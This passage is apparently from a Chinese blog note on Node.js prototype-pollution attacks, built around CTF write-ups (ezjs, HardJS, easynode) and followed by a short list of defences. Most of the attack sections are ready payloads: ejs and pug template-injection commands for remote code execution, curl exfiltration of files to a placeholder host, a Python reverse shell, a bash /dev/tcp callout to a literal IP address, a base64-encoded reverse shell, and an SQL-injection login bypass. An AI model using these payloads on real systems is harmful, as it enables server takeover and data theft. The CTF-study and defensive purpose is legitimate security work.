{"password":"D0g3_Yes!!!", "a": {"__proto__": {"system_open": "yes"}}, "a\"].__proto__[\"system_open": "yes" }
```

##### [巅峰极客 2021]ezjs

https://miaotony.xyz/2021/08/07/CTF_2021dianfengjike/#toc-heading-5

不过这里不能直接传json，用urlencode

```
username=amiz&password=amiz&"].__proto__["isadmin=amiz&"].__proto__["debug=amiz
```

所以就不需要反斜杠什么的去转义json了

污染admin和debug之后成为用admin的cookie打pug的getshell，有CVE-2021-21353

```
/admin?p=');process.mainModule.constructor._load('child_process').exec('whoami');_=('
```

```
curl -F "file=`ls -al /|base64`" http://VPS
curl -F "file=`tac /root/flag.txt`" http://VPS
```

curl外带，或者python shell

```
/admin/?p=');process.mainModule.constructor._load('child_process').exec('python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'vps\',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/bash\',\'-i\']);"');_=('
```

#### ejs(<=3.1.6) + lodash

```
payload="ee;return process.mainModule.require('child_process').execSync('cat /flag && echo successed').toString();//"
```

##### [XNUCA2019Qualifier]HardJS

https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs

前端和后端分别存在原型污染的漏洞，前端的问题来自于ejs的经典`outputFunctionName`（或者`escapeFunction`）

![image-20220426173627138](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220426173627138.png)

后端的问题来自于lodash.defaultsDeep

![image-20220426173612125](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220426173612125.png)

知道漏洞点了，我们如何利用呢？

前端的ejs直接弹shell

```json
{"type":"test","content":{"constructor":{"prototype":
{"outputFunctionName":"a=1;process.mainModule.require('child_process').exec('bash -c \"echo $FLAG>/dev/tcp/101.35.114.107/8426\"')//"}}}}
```

```json
{"constructor": {"prototype": {"client": true,"escapeFunction": "1; return
process.env.FLAG","debug":true, "compileDebug": true}}}
```

[MRCTF 2022]hurry up

#### ejs + js-extend

##### [GKCTF 2021]easynode

一看依赖文件，经典ejs 3.1.5肯定有原型链污染，同时需要别的配合，这里的孤儿选手是js-extend

首先是绕admin权限的登录，在登录处对用户名和密码进行waf处理

![image-20220426181110393](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220426181110393.png)

用了`==`弱比较，并且safeStr用了相加，两个数组相加会得到一个字符串

```
username[]=admin'#&username[]=a&username[]=a&username[]=a&username[]=a&username[]=a&username[]=a&username[]=a&username[]=a&username[]=(&password=123456
```

这样sql语句会变为

```
select * from test where username = 'admin'#,1,1,1,1,1,1,1,1,1*' and password = '123456'
```

直接注释掉password登录

得到admin的token之后再到/addAdmin处添加用户（cookie的token字段记得修改）

```
username=__proto__&password=123
```

/adminDIV处post

```
data={"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('echo YmFzaCAtYyAiYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMDEuMzUuMTE0LjEwNy84NDI2IDA%2BJjEi|base64 -d|bash');var __tmp2"}
```

注意一定要b64+urlencode，再次访问/admin触发rce

## 防御策略

### 冻结原型

```js
Object.freeze(Object.prototype);
Object.freeze(Object);
({}).__proto__.test = 123
({}).test // this will be undefined
```

### 白名单/黑名单

迭代对象属性，过滤`__proto__`和`prototype`，还有一些其它的属性

### 使用map结构

用map数据结构来代替自带的对象结构

### 使用create进行防御

就很nb，它创建好的对象找不到原型链

```js
var obj = Object.create(null);
obj.__proto__ // undefined
obj.constructor // undefined
```

------

{{% spoiler "以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（" %}}

[深入理解 JavaScript Prototype 污染攻击](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html)

[JavaScript_prototype_pollution_attack_in_NodeJS.pdf](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)

[Nodejs 常见模块原型链污染与常见模板污染向 RCE](https://whoamianony.top/2021/10/30/Web%E5%AE%89%E5%85%A8/Nodejs%20%E5%B8%B8%E8%A7%81%E6%A8%A1%E5%9D%97%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E4%B8%8E%E5%B8%B8%E8%A7%81%E6%A8%A1%E6%9D%BF%20RCE/)

[前端原型链污染漏洞竟可以拿下服务器shell？](https://juejin.cn/post/6963950629240733727)

[oooooooldjs writeup1](https://github.com/NeSE-Team/XNUCA2020Qualifier/blob/main/Web/oooooooldjs/writeup.md)  |  [wp2](https://github.com/NeSE-Team/XNUCA2020Qualifier/blob/main/Web/oooooooldjs/writeup.md)

[在JavaScript中实现链式调用](https://juejin.cn/post/6844904030221631495)

{{% /spoiler %}}
